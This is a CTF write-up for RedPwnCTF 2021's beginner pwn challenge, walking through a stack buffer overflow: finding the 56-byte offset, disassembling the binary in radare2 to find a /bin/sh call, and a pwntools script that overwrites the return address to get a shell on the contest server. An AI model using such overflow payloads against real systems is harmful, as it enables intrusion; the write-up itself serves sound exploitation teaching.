+++
author = "biplavxyz"
date = "2021-07-14"
title = "RedPwnCTF-2021 - Writeup - pwn/beginner-generic-pwn-number-0"
+++

Greetings everyone!  
This is going to be writeup about the challenge `beginner-generic-pwn-number-0` of `pwn` category from RedPwnCTF 2021.  
  
`Challenge 1: beginner-generic-pwn-number-0`  
Running the binary with sample input `test` simply exited the program with no error code, while running the binary with very long input threw `segmentation fault` error. So, the program had buffer overflow vulnerability.  
![1](/pwn1checking1.png)  

Then, I tried to find the number of bytes after which overflow occured. I printed a large number of 'A' character and passed it to the program, which caused program to crash with same `segmentation fault` error.  
```perl
perl -E "print 'A' x 58" | ./beginner-generic-pwn-number-0"
```
![3](/pwn1checking3.png)  

Then, I ran `dmesg` command to print the message buffer of kernel.
![4](/pwn1checking4.png)  
It can be seen that crash was caused due to the bad value of `RIP` register.  
`4141` are two extra `A` characters that buffer couldn't handle, and thus it overwrote the instruction pointer.  
As we printed out `58` `A` characters, and had two extra `A`'s, the required offset will be `58-2` which equals to `56`.  

Now, it's time analyze the binary with radare2.
I opened the binary in radare2 with command:  
`r2 beginner-generic-pwn-number-0`, and analyzed the binary with `aaaa`.  
I extracted the binary info with `iI` command.  

![2](/pwn1binaryinfo.png)  
As the binary didn't have canary enable, and wasn't stripped, exploiting it was easy.  
Then, I printed functions list with `afl`, and seeked to the main function with `s main`.  

![5](/pwn1r2-1.png)  

![6](/pwn1r2-2.png)

Then, I printed the disassemble code of main function with `pdf` command. 
It can be seen that there is also an address `0x004012ac` which calls shell.  
```bash
/bin/sh
```
![7](/pwn1r2-addressofshell.png)
As instruction pointer can be controlled , it is possible to jump to the address where shell can be executed.  

I used pwntools to craft a simple exploit and got a shell.

```python
from pwn import *

#elf = ELF('./beginner-generic-pwn-number-0')

#p = elf.process()

#print(p.recv())

p = remote("mc.ax", 31199)

payload = b"A"*56 + p64(0x004012ac)

p.sendline(payload)

p.interactive()
```  

![8](/pwnexploit1.png)

And there it was, I got shell, and got the flag.

Hope you learned something.  
Thanks for reading!  
> - <cite>seizetheday</cite>
